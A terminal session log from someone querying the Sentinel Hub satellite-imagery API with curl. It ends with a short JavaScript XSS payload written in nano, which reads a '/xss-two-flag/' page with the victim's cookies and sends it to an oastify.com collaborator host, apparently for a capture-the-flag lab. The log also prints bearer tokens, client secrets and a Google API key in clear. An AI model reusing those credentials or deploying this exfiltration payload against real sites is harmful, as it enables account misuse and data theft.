{"access_token":"eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJ3dE9hV1o2aFJJeUowbGlsYXctcWd4NzlUdm1hX3ZKZlNuMW1WNm5HX0tVIn0.eyJleHAiOjE3NzMxNDU5OTQsImlhdCI6MTc3MzE0MjM5NCwianRpIjoiNjQzNWM0M2MtMDgxMS00NGI2LWEwNDEtOWU0MzExMDE0ZTE1IiwiaXNzIjoiaHR0cHM6Ly9zZXJ2aWNlcy5zZW50aW5lbC1odWIuY29tL2F1dGgvcmVhbG1zL21haW4iLCJhdWQiOiJodHRwczovL2FwaS5wbGFuZXQuY29tLyIsInN1YiI6IjlhNmRjODk2LTdmZDktNDAyNS1iODlkLTVlZTRlMTdkNDM4ZSIsInR5cCI6IkJlYXJlciIsImF6cCI6IjExNmVlY2RkLWZmMWItNDdmNi04NTkyLWY2OGYwZWE2ZDgxMCIsInNjb3BlIjoiZW1haWwgcHJvZmlsZSIsImNsaWVudEhvc3QiOiIxMDYuNTEuMjQxLjI0NCIsImVtYWlsX3ZlcmlmaWVkIjpmYWxzZSwicGxfcHJvamVjdCI6IjUyZGVlMTBiLWFmMjAtNGU3MC05YWQ2LTgwYzMzZTM0MGIwMiIsInByZWZlcnJlZF91c2VybmFtZSI6InNlcnZpY2UtYWNjb3VudC0xMTZlZWNkZC1mZjFiLTQ3ZjYtODU5Mi1mNjhmMGVhNmQ4MTAiLCJjbGllbnRBZGRyZXNzIjoiMTA2LjUxLjI0MS4yNDQiLCJhY2NvdW50IjoiNTJkZWUxMGItYWYyMC00ZTcwLTlhZDYtODBjMzNlMzQwYjAyIiwicGxfd29ya3NwYWNlIjoiOGFmOWZjMjUtOTJhMy00OTgyLTlmYWQtZjkyMjZhYjFmMTY0IiwiY2xpZW50X2lkIjoiMTE2ZWVjZGQtZmYxYi00N2Y2LTg1OTItZjY4ZjBlYTZkODEwIn0.RBlZpTlN1hm51MX8WBuUloBrxOxRiM27NenVCL0yusPjUgXUv2RF0ARCw2gmdcyf02POFUb3MMsxJtrmbRwaBS8Yq_MpXKqG13Ng1ORiXhP9jaCaka2m-cZG9_XD7BmT01k1eCvNm_itrLIkGlqlOyqLDFJ19QEC78V7bUDSMqDmISMmtx4YUgmEsYPLkwbn2Ea1ae2OhTogXktmfcpRnR_RyMy7vrggE63q6x1haiZH4nIkXbVpmlSMyntBmZgs7UgO9eX5ck1B_S1Vap7dF6sYnpIjyIL44O6NC-qLEhxmfhPQklymCo_y3JgWVa4YNHzqV7H99tWgSkdLaVbCzA","expires_in":3600,"refresh_expires_in":0,"token_type":"Bearer","not-before-policy":0,"scope":"email profile"}(base) Anands-MacBook-Air:shannon anandva$ 
(base) Anands-MacBook-Air:shannon anandva$ 
(base) Anands-MacBook-Air:shannon anandva$ 
(base) Anands-MacBook-Air:shannon anandva$ curl -X POST \
>   https://services.sentinel-hub.com/api/v1/process \
>   -H 'Content-Type: application/json' \
>   -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJ3dE9hV1o2aFJJeUowbGlsYXctcWd4NzlUdm1hX3ZKZlNuMW1WNm5HX0tVIn0.eyJleHAiOjE3NzMxNDU5OTQsImlhdCI6MTc3MzE0MjM5NCwianRpIjoiNjQzNWM0M2MtMDgxMS00NGI2LWEwNDEtOWU0MzExMDE0ZTE1IiwiaXNzIjoiaHR0cHM6Ly9zZXJ2aWNlcy5zZW50aW5lbC1odWIuY29tL2F1dGgvcmVhbG1zL21haW4iLCJhdWQiOiJodHRwczovL2FwaS5wbGFuZXQuY29tLyIsInN1YiI6IjlhNmRjODk2LTdmZDktNDAyNS1iODlkLTVlZTRlMTdkNDM4ZSIsInR5cCI6IkJlYXJlciIsImF6cCI6IjExNmVlY2RkLWZmMWItNDdmNi04NTkyLWY2OGYwZWE2ZDgxMCIsInNjb3BlIjoiZW1haWwgcHJvZmlsZSIsImNsaWVudEhvc3QiOiIxMDYuNTEuMjQxLjI0NCIsImVtYWlsX3ZlcmlmaWVkIjpmYWxzZSwicGxfcHJvamVjdCI6IjUyZGVlMTBiLWFmMjAtNGU3MC05YWQ2LTgwYzMzZTM0MGIwMiIsInByZWZlcnJlZF91c2VybmFtZSI6InNlcnZpY2UtYWNjb3VudC0xMTZlZWNkZC1mZjFiLTQ3ZjYtODU5Mi1mNjhmMGVhNmQ4MTAiLCJjbGllbnRBZGRyZXNzIjoiMTA2LjUxLjI0MS4yNDQiLCJhY2NvdW50IjoiNTJkZWUxMGItYWYyMC00ZTcwLTlhZDYtODBjMzNlMzQwYjAyIiwicGxfd29ya3NwYWNlIjoiOGFmOWZjMjUtOTJhMy00OTgyLTlmYWQtZjkyMjZhYjFmMTY0IiwiY2xpZW50X2lkIjoiMTE2ZWVjZGQtZmYxYi00N2Y2LTg1OTItZjY4ZjBlYTZkODEwIn0.RBlZpTlN1hm51MX8WBuUloBrxOxRiM27NenVCL0yusPjUgXUv2RF0ARCw2gmdcyf02POFUb3MMsxJtrmbRwaBS8Yq_MpXKqG13Ng1ORiXhP9jaCaka2m-cZG9_XD7BmT01k1eCvNm_itrLIkGlqlOyqLDFJ19QEC78V7bUDSMqDmISMmtx4YUgmEsYPLkwbn2Ea1ae2OhTogXktmfcpRnR_RyMy7vrggE63q6x1haiZH4nIkXbVpmlSMyntBmZgs7UgO9eX5ck1B_S1Vap7dF6sYnpIjyIL44O6NC-qLEhxmfhPQklymCo_y3JgWVa4YNHzqV7H99tWgSkdLaVbCzA' \
>   -d '{
>     "input": {
>         "bounds": {
>             "bbox": [
>                 13.822098731994629,
>                 45.42423294091334,
>                 13.929733276367188,
>                 45.48869861773642
>             ],
>             "properties": { "crs": "http://www.opengis.net/def/crs/EPSG/0/4326" }
>         },
>         "data": [ {
>             "type": "sentinel-2-l2a",
>             "dataFilter": { "timeRange": { "from": "2023-06-01T00:00:00Z", "to": "2023-06-30T23:59:59Z" } }
>         } ]
>     },
>     "output": {
>         "width": 512,
>         "height": 512,
>         "responses": [ { "identifier": "default", "format": { "type": "image/png" } } ]
>     }
> }'








{"error":{"status":400,"reason":"Bad Request","message":"Missing or empty evalscript.","code":"COMMON_EXCEPTION"}}(base) Anands-MacBook-Air:shannon anandva$ 
(base) Anands-MacBook-Air:shannon anandva$ 
(base) Anands-MacBook-Air:shannon anandva$ 
(base) Anands-MacBook-Air:shannon anandva$ 
(base) Anands-MacBook-Air:shannon anandva$ 
(base) Anands-MacBook-Air:shannon anandva$ 
(base) Anands-MacBook-Air:shannon anandva$ 
(base) Anands-MacBook-Air:shannon anandva$ 
(base) Anands-MacBook-Air:shannon anandva$ curl -X POST \
>   https://services.sentinel-hub.com/api/v1/process \
>   -H 'Content-Type: application/json' \
>   -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJ3dE9hV1o2aFJJeUowbGlsYXctcWd4NzlUdm1hX3ZKZlNuMW1WNm5HX0tVIn0.eyJleHAiOjE3NzMxNDU5OTQsImlhdCI6MTc3MzE0MjM5NCwianRpIjoiNjQzNWM0M2MtMDgxMS00NGI2LWEwNDEtOWU0MzExMDE0ZTE1IiwiaXNzIjoiaHR0cHM6Ly9zZXJ2aWNlcy5zZW50aW5lbC1odWIuY29tL2F1dGgvcmVhbG1zL21haW4iLCJhdWQiOiJodHRwczovL2FwaS5wbGFuZXQuY29tLyIsInN1YiI6IjlhNmRjODk2LTdmZDktNDAyNS1iODlkLTVlZTRlMTdkNDM4ZSIsInR5cCI6IkJlYXJlciIsImF6cCI6IjExNmVlY2RkLWZmMWItNDdmNi04NTkyLWY2OGYwZWE2ZDgxMCIsInNjb3BlIjoiZW1haWwgcHJvZmlsZSIsImNsaWVudEhvc3QiOiIxMDYuNTEuMjQxLjI0NCIsImVtYWlsX3ZlcmlmaWVkIjpmYWxzZSwicGxfcHJvamVjdCI6IjUyZGVlMTBiLWFmMjAtNGU3MC05YWQ2LTgwYzMzZTM0MGIwMiIsInByZWZlcnJlZF91c2VybmFtZSI6InNlcnZpY2UtYWNjb3VudC0xMTZlZWNkZC1mZjFiLTQ3ZjYtODU5Mi1mNjhmMGVhNmQ4MTAiLCJjbGllbnRBZGRyZXNzIjoiMTA2LjUxLjI0MS4yNDQiLCJhY2NvdW50IjoiNTJkZWUxMGItYWYyMC00ZTcwLTlhZDYtODBjMzNlMzQwYjAyIiwicGxfd29ya3NwYWNlIjoiOGFmOWZjMjUtOTJhMy00OTgyLTlmYWQtZjkyMjZhYjFmMTY0IiwiY2xpZW50X2lkIjoiMTE2ZWVjZGQtZmYxYi00N2Y2LTg1OTItZjY4ZjBlYTZkODEwIn0.RBlZpTlN1hm51MX8WBuUloBrxOxRiM27NenVCL0yusPjUgXUv2RF0ARCw2gmdcyf02POFUb3MMsxJtrmbRwaBS8Yq_MpXKqG13Ng1ORiXhP9jaCaka2m-cZG9_XD7BmT01k1eCvNm_itrLIkGlqlOyqLDFJ19QEC78V7bUDSMqDmISMmtx4YUgmEsYPLkwbn2Ea1ae2OhTogXktmfcpRnR_RyMy7vrggE63q6x1haiZH4nIkXbVpmlSMyntBmZgs7UgO9eX5ck1B_S1Vap7dF6sYnpIjyIL44O6NC-qLEhxmfhPQklymCo_y3JgWVa4YNHzqV7H99tWgSkdLaVbCzA' \
>   -d '{
>     "input": {
>         "bounds": {
>             "bbox": [
>                 13.822098731994629,
>                 45.42423294091334,
>                 13.929733276367188,
>                 45.48869861773642
>             ],
>             "properties": { "crs": "http://www.opengis.net/def/crs/EPSG/0/4326" }
>         },
>         "data": [ {
>             "type": "sentinel-2-l2a",
>             "dataFilter": { 
>                 "timeRange": { 
>                     "from": "2023-06-01T00:00:00Z", 
>                     "to": "2023-06-30T23:59:59Z" 
>                 } 
>             }
>         } ]
>     },
>     "evalscript": "//VERSION=3\nfunction setup() {\n  return {\n    input: [\"B02\", \"B03\", \"B04\"],\n    output: { bands: 3 }\n  };\n}\n\nfunction evaluatePixel(sample) {\n  return [sample.B04 * 2.5, sample.B03 * 2.5, sample.B02 * 2.5];\n}",
>     "output": {
>         "width": 512,
>         "height": 512,
>         "responses": [ { "identifier": "default", "format": { "type": "image/png" } } ]
>     }
> }'
Warning: Binary output can mess up your terminal. Use "--output -" to tell 
Warning: curl to output it to your terminal anyway, or consider "--output 
Warning: <FILE>" to save to a file.
(base) Anands-MacBook-Air:shannon anandva$ curl -X POST   https://services.sentinel-hub.com/api/v1/process   -H 'Content-Type: application/json'   -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJ3dE9hV1o2aFJJeUowbGlsYXctcWd4NzlUdm1hX3ZKZlNuMW1WNm5HX0tVIn0.eyJleHAiOjE3NzMxNDU5OTQsImlhdCI6MTc3MzE0MjM5NCwianRpIjoiNjQzNWM0M2MtMDgxMS00NGI2LWEwNDEtOWU0MzExMDE0ZTE1IiwiaXNzIjoiaHR0cHM6Ly9zZXJ2aWNlcy5zZW50aW5lbC1odWIuY29tL2F1dGgvcmVhbG1zL21haW4iLCJhdWQiOiJodHRwczovL2FwaS5wbGFuZXQuY29tLyIsInN1YiI6IjlhNmRjODk2LTdmZDktNDAyNS1iODlkLTVlZTRlMTdkNDM4ZSIsInR5cCI6IkJlYXJlciIsImF6cCI6IjExNmVlY2RkLWZmMWItNDdmNi04NTkyLWY2OGYwZWE2ZDgxMCIsInNjb3BlIjoiZW1haWwgcHJvZmlsZSIsImNsaWVudEhvc3QiOiIxMDYuNTEuMjQxLjI0NCIsImVtYWlsX3ZlcmlmaWVkIjpmYWxzZSwicGxfcHJvamVjdCI6IjUyZGVlMTBiLWFmMjAtNGU3MC05YWQ2LTgwYzMzZTM0MGIwMiIsInByZWZlcnJlZF91c2VybmFtZSI6InNlcnZpY2UtYWNjb3VudC0xMTZlZWNkZC1mZjFiLTQ3ZjYtODU5Mi1mNjhmMGVhNmQ4MTAiLCJjbGllbnRBZGRyZXNzIjoiMTA2LjUxLjI0MS4yNDQiLCJhY2NvdW50IjoiNTJkZWUxMGItYWYyMC00ZTcwLTlhZDYtODBjMzNlMzQwYjAyIiwicGxfd29ya3NwYWNlIjoiOGFmOWZjMjUtOTJhMy00OTgyLTlmYWQtZjkyMjZhYjFmMTY0IiwiY2xpZW50X2lkIjoiMTE2ZWVjZGQtZmYxYi00N2Y2LTg1OTItZjY4ZjBlYTZkODEwIn0.RBlZpTlN1hm51MX8WBuUloBrxOxRiM27NenVCL0yusPjUgXUv2RF0ARCw2gmdcyf02POFUb3MMsxJtrmbRwaBS8Yq_MpXKqG13Ng1ORiXhP9jaCaka2m-cZG9_XD7BmT01k1eCvNm_itrLIkGlqlOyqLDFJ19QEC78V7bUDSMqDmISMmtx4YUgmEsYPLkwbn2Ea1ae2OhTogXktmfcpRnR_RyMy7vrggE63q6x1haiZH4nIkXbVpmlSMyntBmZgs7UgO9eX5ck1B_S1Vap7dF6sYnpIjyIL44O6NC-qLEhxmfhPQklymCo_y3JgWVa4YNHzqV7H99tWgSkdLaVbCzA'   -d '{
    "input": {
        "bounds": {
            "bbox": [
                13.822098731994629,
                45.42423294091334,
                13.929733276367188,
                45.48869861773642
            ],
            "properties": { "crs": "http://www.opengis.net/def/crs/EPSG/0/4326" }
        },
        "data": [ {
            "type": "sentinel-2-l2a",
            "dataFilter": { 
                "timeRange": { 
                    "from": "2023-06-01T00:00:00Z", 
                    "to": "2023-06-30T23:59:59Z" 
                } 
            }
        } ]
    },
    "evalscript": "//VERSION=3\nfunction setup() {\n  return {\n    input: [\"B02\", \"B03\", \"B04\"],\n    output: { bands: 3 }\n  };\n}\n\nfunction evaluatePixel(sample) {\n  return [sample.B04 * 2.5, sample.B03 * 2.5, sample.B02 * 2.5];\n}",
    "output": {
        "width": 512,
        "height": 512,
        "responses": [ { "identifier": "default", "format": { "type": "image/png" } } ]
    }
}'
Warning: Binary output can mess up your terminal. Use "--output -" to tell 
Warning: curl to output it to your terminal anyway, or consider "--output 
Warning: <FILE>" to save to a file.
(base) Anands-MacBook-Air:shannon anandva$ \
> 
(base) Anands-MacBook-Air:shannon anandva$ 
(base) Anands-MacBook-Air:shannon anandva$ 
(base) Anands-MacBook-Air:shannon anandva$ 
(base) Anands-MacBook-Air:shannon anandva$ curl -X POST "https://services.sentinel-hub.com/auth/realms/main/protocol/openid-connect/token"  -H "Content-Type: application/x-www-form-urlencoded"  -d "grant_type=client_credentials"  -d "client_id=116eecdd-ff1b-47f6-8592-f68f0ea6d810"  -d "client_secret=TeTqh5HIAaqAx4VimmsyiYf8nUSjBVS9"
{"access_token":"eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJ3dE9hV1o2aFJJeUowbGlsYXctcWd4NzlUdm1hX3ZKZlNuMW1WNm5HX0tVIn0.eyJleHAiOjE3NzMyOTUxOTQsImlhdCI6MTc3MzI5MTU5NCwianRpIjoiODA4YzIyZDYtZGMzNS00MjI2LTk5MzctODdkNzUxZmMwYjdkIiwiaXNzIjoiaHR0cHM6Ly9zZXJ2aWNlcy5zZW50aW5lbC1odWIuY29tL2F1dGgvcmVhbG1zL21haW4iLCJhdWQiOiJodHRwczovL2FwaS5wbGFuZXQuY29tLyIsInN1YiI6IjlhNmRjODk2LTdmZDktNDAyNS1iODlkLTVlZTRlMTdkNDM4ZSIsInR5cCI6IkJlYXJlciIsImF6cCI6IjExNmVlY2RkLWZmMWItNDdmNi04NTkyLWY2OGYwZWE2ZDgxMCIsInNjb3BlIjoiZW1haWwgcHJvZmlsZSIsImNsaWVudEhvc3QiOiIxNTIuNTcuNzAuMCIsImVtYWlsX3ZlcmlmaWVkIjpmYWxzZSwicGxfcHJvamVjdCI6IjUyZGVlMTBiLWFmMjAtNGU3MC05YWQ2LTgwYzMzZTM0MGIwMiIsInByZWZlcnJlZF91c2VybmFtZSI6InNlcnZpY2UtYWNjb3VudC0xMTZlZWNkZC1mZjFiLTQ3ZjYtODU5Mi1mNjhmMGVhNmQ4MTAiLCJjbGllbnRBZGRyZXNzIjoiMTUyLjU3LjcwLjAiLCJhY2NvdW50IjoiNTJkZWUxMGItYWYyMC00ZTcwLTlhZDYtODBjMzNlMzQwYjAyIiwicGxfd29ya3NwYWNlIjoiOGFmOWZjMjUtOTJhMy00OTgyLTlmYWQtZjkyMjZhYjFmMTY0IiwiY2xpZW50X2lkIjoiMTE2ZWVjZGQtZmYxYi00N2Y2LTg1OTItZjY4ZjBlYTZkODEwIn0.Cq93mWzE_Zcj53kffIumvBPTmRvJzeidB5LCSjvtVMCFh4ekbSjYj0KWdf8KpLwENWzBTBHsufMsNbNDhrvHaB-RoWN0Ng5-fWU1g8DycVkUULQH75KKT-WEzl4bdkCGjkILAIJE7OfzYJqVP_B83ZIQehG208Xo0htxlqX326t4AwXSfVf1Vs7jeXcOO7bcZr3G1ZZ2tfQpldfm0BPDM7ERLox44Bjw-a315NcxuzIVRwzWWIY9h0ubSUAB2wkfTqdRgN7FatTd0LFYBbG7Npuv0U6Xs5yh38hTNulM_Gi5bY1jO4-rb_xVmheqhlM9dWEfDLfeqxwf25MBeesXeg","expires_in":3600,"refresh_expires_in":0,"token_type":"Bearer","not-before-policy":0,"scope":"email profile"}(base) Anands-MacBook-Air:shannon anandva$ curl -X POST "https://services.sentinel-hub.com/auth/realms/main/protocol/openid-connect/token"  -H "Content-Type: application/x-www-form-urlencodee=client_credentials"  -d "client_id=b2632ff6-e5cf-409d-bae1-e7baa6871b93"  -d "client_secret=C1FES9PcFm1hAK1bREW3HLsnZ8vW4qfr"

curl: (6) Could not resolve host: services.sentinel-hub.com
(base) Anands-MacBook-Air:shannon anandva$ 
(base) Anands-MacBook-Air:shannon anandva$ curl -X POST "https://services.sentinel-hub.com/auth/realms/main/protocol/openid-connect/token"  -H "Content-Type: application/x-www-form-urlencoded"  -d "grant_type=client_credentials"  -d "client_id=b2632ff6-e5cf-409d-bae1-e7baa6871b93"  -d "client_secret=C1FES9PcFm1hAK1bREW3HLsnZ8vW4qfr"
{"error":"invalid_client","error_description":"Invalid client or Invalid client credentials"}(base) Anands-MacBook-Air:shannon anandva$ curl "https://generativelanguage.googleapis.com/v1beta/files?key=AIzaSyCIyNoSvMJOtdPvP0d-cBgea9Mu5_TRGxs"
{
  "error": {
    "code": 403,
    "message": "Generative Language API has not been used in project 445009168042 before or it is disabled. Enable it by visiting https://console.developers.google.com/apis/api/generativelanguage.googleapis.com/overview?project=445009168042 then retry. If you enabled this API recently, wait a few minutes for the action to propagate to our systems and retry.",
    "status": "PERMISSION_DENIED",
    "details": [
      {
        "@type": "type.googleapis.com/google.rpc.ErrorInfo",
        "reason": "SERVICE_DISABLED",
        "domain": "googleapis.com",
        "metadata": {
          "containerInfo": "445009168042",
          "activationUrl": "https://console.developers.google.com/apis/api/generativelanguage.googleapis.com/overview?project=445009168042",
          "serviceTitle": "Generative Language API",
          "service": "generativelanguage.googleapis.com",
          "consumer": "projects/445009168042"
        }
      },
      {
        "@type": "type.googleapis.com/google.rpc.LocalizedMessage",
        "locale": "en-US",
        "message": "Generative Language API has not been used in project 445009168042 before or it is disabled. Enable it by visiting https://console.developers.google.com/apis/api/generativelanguage.googleapis.com/overview?project=445009168042 then retry. If you enabled this API recently, wait a few minutes for the action to propagate to our systems and retry."
      },
      {
        "@type": "type.googleapis.com/google.rpc.Help",
        "links": [
          {
            "description": "Google developers console API activation",
            "url": "https://console.developers.google.com/apis/api/generativelanguage.googleapis.com/overview?project=445009168042"
          }
        ]
      }
    ]
  }
}
(base) Anands-MacBook-Air:shannon anandva$ ls
assets				COVERAGE.md			Dockerfile			package-lock.json		repos				src
audit-logs			credentials			LICENSE				package.json			sample-reports			tsconfig.json
CLAUDE.md			docker-compose.docker.yml	mcp-server			prompts				shannon				xben-benchmark-results
configs				docker-compose.yml		node_modules			README.md			SHANNON-PRO.md
(base) Anands-MacBook-Air:shannon anandva$ cd ..
(base) Anands-MacBook-Air:~ anandva$ ls
Anand_DA_Mac_Data		Desktop				iCloud Drive (Archive)		nuclei-templates		rahul
Applications			Documents			Library				Pictures			shannon
CA_Org_local_copy		Downloads			LLM-ctfs			Postman				sqlmap-dev
Cisco Packet Tracer 9.0.0	gg.html				Movies				Postman Agent			test.txt
db.sqlite3			go				Music				Public				urls.txt
(base) Anands-MacBook-Air:~ anandva$ touch test.js
(base) Anands-MacBook-Air:~ anandva$ nano test.js

  UW PICO 5.09                                                                                     File: test.js                                                                                     Modified  

var xhr = new XMLHttpRequest();
xhr.open('GET', '/xss-two-flag/', true);
xhr.withCredentials = true;

xhr.onload = function() {
 var exfil = new XMLHttpRequest();
 exfil.open('GET', 'https://s6zeiasgs5npglv3l458vzivgmmda6yv.oastify.com?flag=' + encodeURIComponent(xhr.responseText), true);
 exfil.send();
};

xhr.send();















































^G Get Help                       ^O WriteOut                       ^R Read File                      ^Y Prev Pg                        ^K Cut Text                       ^C Cur Pos                        
^X Exit                           ^J Justify                        ^W Where is                       ^V Next Pg                        ^U UnCut Text                     ^T To Spell                       
